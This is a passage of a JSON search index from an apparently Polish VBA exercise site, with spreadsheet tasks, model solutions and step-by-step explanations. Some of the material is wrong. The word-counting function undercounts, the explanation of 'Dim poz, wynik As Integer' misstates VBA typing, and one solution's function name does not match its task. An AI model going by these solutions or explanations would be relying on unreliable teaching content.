</ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Kom\u00f3rki <code>A1:A10</code> zawieraj\u0105 imiona i nazwiska oddzielone pojedyncz\u0105 spacj\u0105. Stw\u00f3rz przycisk, kt\u00f3ry po klikni\u0119ciu umie\u015bci w kolumnie B imiona, a w kolumnie C nazwiska z odpowiadaj\u0105cych kom\u00f3rek z kolumny A.</p>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Sub Podziel_Click()\n    Dim dane, imiona, nazwiska As Range\n    Dim poz As Integer\n\n    Set dane = Range(\"A1:A10\")\n    Set imiona = Range(\"B1\")\n    Set nazwiska = Range(\"C1\")\n\n    For Each kom In dane\n        poz = InStr(kom.Value, \" \")\n        imiona.Value = Left(kom.Value, poz)\n        nazwiska.Value = Right(kom.Value, Len(kom.Value) - poz)\n        Set imiona = imiona.Offset(1, 0)\n        Set nazwiska = nazwiska.Offset(1, 0)\n    Next kom\nEnd Sub\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#1-deklarowanie-zmiennych","title":"1. Deklarowanie zmiennych","text":"<pre><code>Dim dane, imiona, nazwiska As Range\nDim poz As Integer\n</code></pre> <ul> <li><code>Dim</code> to skr\u00f3t od \"Dimension\" i s\u0142u\u017cy do deklarowania zmiennych.</li> <li><code>dane, imiona, nazwiska</code> to zmienne, kt\u00f3re b\u0119d\u0105 przechowywa\u0107 odniesienia do zakres\u00f3w kom\u00f3rek (czyli grup kom\u00f3rek) w arkuszu.</li> <li><code>poz</code> to zmienna typu Integer, kt\u00f3ra b\u0119dzie przechowywa\u0107 pozycj\u0119, gdzie znajduje si\u0119 spacja w ci\u0105gu znak\u00f3w.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#2-ustawianie-zakresow","title":"2. Ustawianie zakres\u00f3w","text":"<pre><code>Set dane = Range(\"A1:A10\")\nSet imiona = Range(\"B1\")\nSet nazwiska = Range(\"C1\")\n</code></pre> <ul> <li><code>Set</code> s\u0142u\u017cy do przypisania odniesienia do obiektu do zmiennej.</li> <li><code>dane</code> jest ustawiony na kom\u00f3rki od A1 do A10, <code>imiona</code> na kom\u00f3rk\u0119 B1, a <code>nazwiska</code> na C1.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#3-petla-przez-komorki-w-zakres1","title":"3. P\u0119tla przez kom\u00f3rki w zakres1","text":"<pre><code>For Each kom In dane\n</code></pre> <ul> <li><code>For Each</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra wykona blok kodu dla ka\u017cdego elementu w kolekcji (tutaj dla ka\u017cdej kom\u00f3rki w zakresie <code>dane</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#4-szukanie-pozycji-spacji-i-dzielenie-tekstu","title":"4. Szukanie pozycji spacji i dzielenie tekstu","text":"<pre><code>    poz = InStr(kom.Value, \" \")\n    imiona.Value = Left(kom.Value, poz)\n    nazwiska.Value = Right(kom.Value, Len(kom.Value) - poz)\n</code></pre> <ul> <li><code>InStr(kom.Value, \" \")</code> znajduje pozycj\u0119 pierwszej spacji w tek\u015bcie kom\u00f3rki.</li> <li><code>Left(kom.Value, poz)</code> wycina lew\u0105 cz\u0119\u015b\u0107 tekstu do spacji.</li> <li><code>Right(kom.Value, Len(kom.Value) - poz)</code> wycina praw\u0105 cz\u0119\u015b\u0107 tekstu od spacji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#5-przesuwanie-zakresow","title":"5. Przesuwanie zakres\u00f3w","text":"<pre><code>    Set imiona = imiona.Offset(1, 0)\n    Set nazwiska = nazwiska.Offset(1, 0)\n</code></pre> <ul> <li><code>Offset(1, 0)</code> przesuwa zakres o jedn\u0105 kom\u00f3rk\u0119 w d\u00f3\u0142. To oznacza, \u017ce nast\u0119pny podzielony tekst zostanie umieszczony w kolejnej kom\u00f3rce w d\u00f3\u0142.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#6-koniec-petli","title":"6. Koniec p\u0119tli","text":"<pre><code>Next kom\n</code></pre> <ul> <li><code>Next</code> oznacza koniec p\u0119tli <code>For Each</code> i powr\u00f3t do jej pocz\u0105tku, by przej\u015b\u0107 do kolejnej kom\u00f3rki w zakresie <code>dane</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-4/#7-koniec-procedury","title":"7. Koniec procedury","text":"<pre><code>End Sub\n</code></pre> <ul> <li><code>End Sub</code> oznacza koniec skryptu (procedury).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>ZliczWyrazy</code>, kt\u00f3ra dla podanego tekstu zwr\u00f3ci liczb\u0119 wyraz\u00f3w w nim zawartych. Za wyraz uznajemy ci\u0105g znak\u00f3w nie zawieraj\u0105cy spacji, a wyrazy s\u0105 oddzielone pojedyncz\u0105 spacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function ZliczWyrazy(tekst As String) As Integer\n    Dim poz, wynik As Integer\n\n    poz = 1\n    wynik = 0\n\n    While poz &gt; 0 And poz &lt; Len(tekst)\n        poz = InStr(poz, tekst, \" \")\n        If poz &gt; 0 Then\n            poz = poz + 1\n        End If\n\n        wynik = wynik + 1\n    Wend\n\n    ZliczWyrazy = wynik\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function ZliczWyrazy(tekst As String) As Integer\n</code></pre> <ul> <li><code>Function ZliczWyrazy</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>ZliczWyrazy</code>.</li> <li><code>tekst As String</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>tekst</code>, kt\u00f3ry jest typu <code>String</code> (ci\u0105g znak\u00f3w).</li> <li><code>As Integer</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 ca\u0142kowit\u0105 (<code>Integer</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#2-deklarowanie-i-inicjalizacja-zmiennych","title":"2. Deklarowanie i inicjalizacja zmiennych","text":"<pre><code>Dim poz, wynik As Integer\n\npoz = 1\nwynik = 0\n</code></pre> <ul> <li><code>Dim poz, wynik As Integer</code> deklaruje dwie zmienne <code>poz</code> i <code>wynik</code> jako liczby ca\u0142kowite.</li> <li><code>poz = 1</code> inicjalizuje zmienn\u0105 <code>poz</code> warto\u015bci\u0105 1, kt\u00f3ra b\u0119dzie u\u017cywana do \u015bledzenia pozycji w tek\u015bcie.</li> <li><code>wynik = 0</code> inicjalizuje zmienn\u0105 <code>wynik</code> warto\u015bci\u0105 0, kt\u00f3ra b\u0119dzie u\u017cywana do zliczania wyraz\u00f3w.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#3-petla-obliczeniowa","title":"3. P\u0119tla obliczeniowa","text":"<pre><code>While poz &gt; 0 And poz &lt; Len(tekst)\n</code></pre> <ul> <li><code>While poz &gt; 0 And poz &lt; Len(tekst)</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra b\u0119dzie si\u0119 wykonywa\u0107, dop\u00f3ki <code>poz</code> jest wi\u0119ksze od 0 i mniejsze od d\u0142ugo\u015bci ca\u0142ego tekstu.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#4-szukanie-spacji-i-zliczanie-wyrazow","title":"4. Szukanie spacji i zliczanie wyraz\u00f3w","text":"<pre><code>    poz = InStr(poz, tekst, \" \")\n    If poz &gt; 0 Then\n        poz = poz + 1\n    End If\n\n    wynik = wynik + 1\n</code></pre> <ul> <li><code>poz = InStr(poz, tekst, \" \")</code> szuka pierwszej spacji w tek\u015bcie zaczynaj\u0105c od pozycji <code>poz</code>. Je\u015bli znajdzie, <code>poz</code> zostanie zaktualizowane do pozycji tej spacji.</li> <li><code>If poz &gt; 0 Then poz = poz + 1</code> przesuwa <code>poz</code> o jeden dalej, aby unikn\u0105\u0107 ponownego zliczania tej samej spacji.</li> <li><code>wynik = wynik + 1</code> inkrementuje zmienn\u0105 <code>wynik</code> o 1 za ka\u017cdym razem, gdy znaleziono spacj\u0119, co oznacza kolejny wyraz.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#5-koniec-petli","title":"5. Koniec p\u0119tli","text":"<pre><code>Wend\n</code></pre> <ul> <li><code>Wend</code> ko\u0144czy p\u0119tl\u0119 <code>While</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#6-zwracanie-wyniku","title":"6. Zwracanie wyniku","text":"<pre><code>ZliczWyrazy = wynik\n</code></pre> <ul> <li><code>ZliczWyrazy = wynik</code> przypisuje ostateczn\u0105 warto\u015b\u0107 zmiennej <code>wynik</code> do samej funkcji <code>ZliczWyrazy</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-5/#7-koniec-funkcji","title":"7. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/","title":"Podstawowe","text":""},{"location":"spreadsheet/vba/exercises/basic/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz funkcj\u0119 <code>CnaF</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Skorzystaj z nast\u0119puj\u0105cego wzoru:</p> <p>\\(F = \\frac{9}{5} * C + 32\\)</p> <p>gdzie:</p> <ul> <li>\\(C\\) - temperatura podana w stopniach Celsjusza</li> <li>\\(F\\) - temperatura podana w stopniach Fahrenheita</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane","title":"Dane","text":"<ul> <li>\\(temp\\) - liczba rzeczywista, temperatura podana w stopniach Celsjusza</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik","title":"Wynik","text":"<ul> <li>Podana temperatura przekonwertowana na stopnie Fahrenheita.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad","title":"Przyk\u0142ad","text":"<pre><code>CnaF(-50) = -58\nCnaF(0) = 32\nCnaF(100) = 212\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz funkcj\u0119 <code>KonwTemp</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Skorzystaj z nast\u0119puj\u0105cych wzor\u00f3w:</p> <ul> <li>\\(C = K - 273.15\\)</li> <li>\\(C = \\frac{5}{9} * (F - 32)\\)</li> <li>\\(F = \\frac{9}{5} * C + 32\\)</li> <li>\\(F = \\frac{9}{5} * K - 459.67\\)</li> <li>\\(K = C + 273.15\\)</li> <li>\\(K = \\frac{5}{9} * (F + 459.67)\\)</li> </ul> <p>gdzie:</p> <ul> <li>\\(C\\) - temperatura podana w stopniach Celsjusza</li> <li>\\(F\\) - temperatura podana w stopniach Fahrenheita</li> <li>\\(K\\) - temperatura podana w stopniach Kelvina</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane_1","title":"Dane","text":"<ul> <li>\\(temp\\) - liczba rzeczywista, temperatura do konwersji</li> <li>\\(jednZ\\) - jeden znak, wielka litera oznaczaj\u0105ca jednostk\u0119 temperatury z kt\u00f3rej nale\u017cy dokona\u0107 konwersji</li> <li>\\(jednDo\\) - jeden znak, wielka litera oznaczaj\u0105ca jednostk\u0119 temperatury do kt\u00f3rej nale\u017cy dokona\u0107 konwersji</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik_1","title":"Wynik","text":"<ul> <li>Podana temperatura przekonwertowana z jednostki \\(jednZ\\) do jednostki \\(jednDo\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>KonwTemp(0; \"C\"; \"F\") = 32\nKonwTemp(32; \"F\"; \"C\") = 0\nKonwTemp(212; \"F\"; \"K\") = 373.15\nKonwTemp(100; \"K\"; \"F\") = -279.67\nKonwTemp(-40; \"C\"; \"K\") = 233.15\nKonwTemp(273.15; \"K\"; \"C\") = 0\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz funkcj\u0119 <code>CzyParzysta</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik_2","title":"Wynik","text":"<ul> <li>PRAWDA, je\u017celi \\(n\\) jest liczb\u0105 parzyst\u0105, FA\u0141SZ w przeciwnym przypadku.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_2","title":"Przyk\u0142ad","text":"<pre><code>CzyParzysta(0) = PRAWDA\nCzyParzysta(1) = FA\u0141SZ\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz funkcj\u0119 <code>IleParzystych</code> zliczaj\u0105c\u0105 ile kom\u00f3rek z podanego zakresu zawiera liczby parzyste.</p>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_3","title":"Przyk\u0142ad","text":"<pre><code>IleParzystych(A1:A10) = 3\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz funkcj\u0119 <code>NWW</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane_3","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna</li> <li>\\(b\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik_3","title":"Wynik","text":"<ul> <li>Najmniejsza wsp\u00f3lna wielokrotno\u015b\u0107 liczb \\(a\\) i \\(b\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_4","title":"Przyk\u0142ad","text":"<pre><code>NWW(4; 8) = 8\nNWW(3; 5) = 15\nNWW(10; 6) = 30\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz funkcj\u0119 <code>IleCyfr</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane_4","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik_4","title":"Wynik","text":"<ul> <li>Liczba cyfr liczby \\(n\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_5","title":"Przyk\u0142ad","text":"<pre><code>IleCyfr(12345) = 5\nIleCyfr(212) = 3\nIleCyfr(0) = 1\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz funkcj\u0119 <code>Fibonacci</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane_5","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik_5","title":"Wynik","text":"<ul> <li>Liczba Fibonacciego o indeksie \\(n\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_6","title":"Przyk\u0142ad","text":"<pre><code>Fibonacci(0) = 0\nFibonacci(1) = 1\nFibonacci(2) = 1\nFibonacci(3) = 2\nFibonacci(4) = 3\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz funkcj\u0119 <code>ZWielkiej</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/#dane_6","title":"Dane","text":"<ul> <li>\\(wyraz\\) - ci\u0105g znak\u00f3w</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#wynik_6","title":"Wynik","text":"<ul> <li>Podany wyraz, w kt\u00f3rym pierwsza litera jest wielka.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/#przykad_7","title":"Przyk\u0142ad","text":"<pre><code>ZWielkiej(\"Ala\") = \"Ala\"\nZWielkiej(\"ala\") = \"Ala\"\nZWielkiej(\"ALA\") = \"ALA\"\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>CnaF</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Skorzystaj z nast\u0119puj\u0105cego wzoru:</p> <p>\\(F = \\frac{9}{5} * C + 32\\)</p> <p>gdzie:</p> <ul> <li>\\(C\\) - temperatura podana w stopniach Celsjusza</li> <li>\\(F\\) - temperatura podana w stopniach Fahrenheita</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(temp\\) - liczba rzeczywista, temperatura podana w stopniach Celsjusza</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Podana temperatura przekonwertowana na stopnie Fahrenheita.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function CtoF(temp As Double) As Double\n    CtoF = ((temp * 9) / 5) + 32\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-1/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function CtoF(temp As Double) As Double\n</code></pre> <ul> <li><code>Function CtoF</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>CtoF</code>.</li> <li><code>temp As Double</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>temp</code>, kt\u00f3ry jest typu <code>Double</code>. Typ <code>Double</code> to typ danych s\u0142u\u017c\u0105cy do przechowywania du\u017cych liczb zmiennoprzecinkowych.</li> <li><code>As Double</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 typu <code>Double</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/#2-wykonanie-obliczen","title":"2. Wykonanie oblicze\u0144","text":"<pre><code>    CtoF = ((temp * 9) / 5) + 32\n</code></pre> <ul> <li>Ta linia jest sercem funkcji. Przeprowadza rzeczywiste przeliczenie temperatury z Celsjusza na Fahrenheita.</li> <li><code>((temp * 9) / 5) + 32</code> to wz\u00f3r matematyczny na przeliczenie Celsjusza na Fahrenheita.</li> <li>Najpierw mno\u017cy temperatur\u0119 w Celsjuszu (<code>temp</code>) przez 9.</li> <li>Nast\u0119pnie wynik dzieli przez 5.</li> <li>Wreszcie dodaje 32, by uzyska\u0107 odpowiednik w stopniach Fahrenheita.</li> <li><code>CtoF =</code> przypisuje wynik tego obliczenia do samej funkcji <code>CtoF</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-1/#3-koniec-funkcji","title":"3. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>KonwTemp</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Skorzystaj z nast\u0119puj\u0105cych wzor\u00f3w:</p> <ul> <li>\\(C = K - 273.15\\)</li> <li>\\(C = \\frac{5}{9} * (F - 32)\\)</li> <li>\\(F = \\frac{9}{5} * C + 32\\)</li> <li>\\(F = \\frac{9}{5} * K - 459.67\\)</li> <li>\\(K = C + 273.15\\)</li> <li>\\(K = \\frac{5}{9} * (F + 459.67)\\)</li> </ul> <p>gdzie:</p> <ul> <li>\\(C\\) - temperatura podana w stopniach Celsjusza</li> <li>\\(F\\) - temperatura podana w stopniach Fahrenheita</li> <li>\\(K\\) - temperatura podana w stopniach Kelvina</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(temp\\) - liczba rzeczywista, temperatura do konwersji</li> <li>\\(jednZ\\) - jeden znak, wielka litera oznaczaj\u0105ca jednostk\u0119 temperatury z kt\u00f3rej nale\u017cy dokona\u0107 konwersji</li> <li>\\(jednDo\\) - jeden znak, wielka litera oznaczaj\u0105ca jednostk\u0119 temperatury do kt\u00f3rej nale\u017cy dokona\u0107 konwersji</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Podana temperatura przekonwertowana z jednostki \\(jednZ\\) do jednostki \\(jednDo\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function KonwTemp(temp As Double, jednZ As String, jednDo As String) As Double\n    If jednZ = \"C\" Then\n        If jednDo = \"F\" Then\n            KonwTemp = ((temp * 9) / 5) + 32\n        ElseIf jednDo = \"K\" Then\n            KonwTemp = temp + 273.15\n        End If\n    ElseIf jednZ = \"F\" Then\n        If jednDo = \"C\" Then\n            KonwTemp = ((temp - 32) * 5) / 9\n        ElseIf jednDo = \"K\" Then\n            KonwTemp = ((temp + 459.67) * 5) / 9\n        End If\n    ElseIf jednZ = \"K\" Then\n        If jednDo = \"C\" Then\n            KonwTemp = temp - 273.15\n        ElseIf jednDo = \"F\" Then\n            KonwTemp = ((temp * 9) / 5) - 459.67\n        End If\n    End If\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-2/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function KonwTemp(temp As Double, jednZ As String, jednDo As String) As Double\n</code></pre> <ul> <li>Funkcja <code>KonwTemp</code> przyjmuje trzy argumenty: <code>temp</code> (temperatura do konwersji), <code>jednZ</code> (jednostka wyj\u015bciowa) i <code>jednDo</code> (jednostka docelowa). Zwraca liczb\u0119 zmiennoprzecinkow\u0105 (<code>Double</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#2-pierwszy-warunek-konwersja-z-celsjusza","title":"2. Pierwszy warunek - konwersja z Celsjusza","text":"<pre><code>If jednZ = \"C\" Then\n</code></pre> <ul> <li> <p>Sprawdza, czy jednostka wyj\u015bciowa to Celsjusz.</p> <ul> <li>Konwersja na Fahrenheita:</li> </ul> <pre><code>If jednDo = \"F\" Then\n    KonwTemp = ((temp * 9) / 5) + 32\n</code></pre> <ul> <li> <p>Je\u015bli jednostka docelowa to Fahrenheit, przelicza temperatur\u0119 z Celsjusza na Fahrenheita.</p> </li> <li> <p>Konwersja na Kelvina:</p> </li> </ul> <pre><code>ElseIf jednDo = \"K\" Then\n    KonwTemp = temp + 273.15\n</code></pre> <ul> <li>Je\u015bli jednostka docelowa to Kelvin, przelicza temperatur\u0119 z Celsjusza na Kelvina.</li> </ul> </li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#3-drugi-warunek-konwersja-z-fahrenheita","title":"3. Drugi warunek - konwersja z Fahrenheita","text":"<pre><code>ElseIf jednZ = \"F\" Then\n</code></pre> <ul> <li> <p>Sprawdza, czy jednostka wyj\u015bciowa to Fahrenheit.</p> <ul> <li>Konwersja na Celsjusza:</li> </ul> <pre><code>If jednDo = \"C\" Then\n    KonwTemp = ((temp - 32) * 5) / 9\n</code></pre> <ul> <li> <p>Je\u015bli jednostka docelowa to Celsjusz, przelicza temperatur\u0119 z Fahrenheita na Celsjusza.</p> </li> <li> <p>Konwersja na Kelvina:</p> </li> </ul> <pre><code>ElseIf jednDo = \"K\" Then\n    KonwTemp = ((temp + 459.67) * 5) / 9\n</code></pre> <ul> <li>Je\u015bli jednostka docelowa to Kelvin, przelicza temperatur\u0119 z Fahrenheita na Kelvina.</li> </ul> </li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#4-trzeci-warunek-konwersja-z-kelvina","title":"4. Trzeci warunek - konwersja z Kelvina","text":"<pre><code>ElseIf jednZ = \"K\" Then\n</code></pre> <ul> <li> <p>Sprawdza, czy jednostka wyj\u015bciowa to Kelvin.</p> <ul> <li>Konwersja na Celsjusza:</li> </ul> <pre><code>If jednDo = \"C\" Then\n    KonwTemp = temp - 273.15\n</code></pre> <ul> <li> <p>Je\u015bli jednostka docelowa to Celsjusz, przelicza temperatur\u0119 z Kelvina na Celsjusza.</p> </li> <li> <p>Konwersja na Fahrenheita:</p> </li> </ul> <pre><code>ElseIf jednDo = \"F\" Then\n    KonwTemp = ((temp * 9) / 5) - 459.67\n</code></pre> <ul> <li>Je\u015bli jednostka docelowa to Fahrenheit, przelicza temperatur\u0119 z Kelvina na Fahrenheita.</li> </ul> </li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-2/#5-koniec-funkcji","title":"5. Koniec funkcji","text":"<pre><code>End If\nEnd Function\n</code></pre> <ul> <li><code>End If</code> i <code>End Function</code> oznaczaj\u0105 koniec struktury warunkowej i samej funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>CzyParzysta</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#wynik","title":"Wynik","text":"<ul> <li>PRAWDA, je\u017celi \\(n\\) jest liczb\u0105 parzyst\u0105, FA\u0141SZ w przeciwnym przypadku.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function CzyParzysta(n As Integer) As Boolean\n    If n Mod 2 = 0 Then\n        CzyParzysta = True\n    Else\n        CzyParzysta = False\n    End If\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-3/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function CzyParzysta(n As Integer) As Boolean\n</code></pre> <ul> <li><code>Function CzyParzysta</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>CzyParzysta</code>.</li> <li><code>n As Integer</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>n</code>, kt\u00f3ry jest typu <code>Integer</code> (liczba ca\u0142kowita).</li> <li><code>As Boolean</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 logiczn\u0105 (Prawda/Fa\u0142sz).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#2-sprawdzenie-czy-liczba-jest-parzysta","title":"2. Sprawdzenie, czy liczba jest parzysta","text":"<pre><code>If n Mod 2 = 0 Then\n</code></pre> <ul> <li><code>If</code> rozpoczyna struktur\u0119 warunkow\u0105.</li> <li><code>n Mod 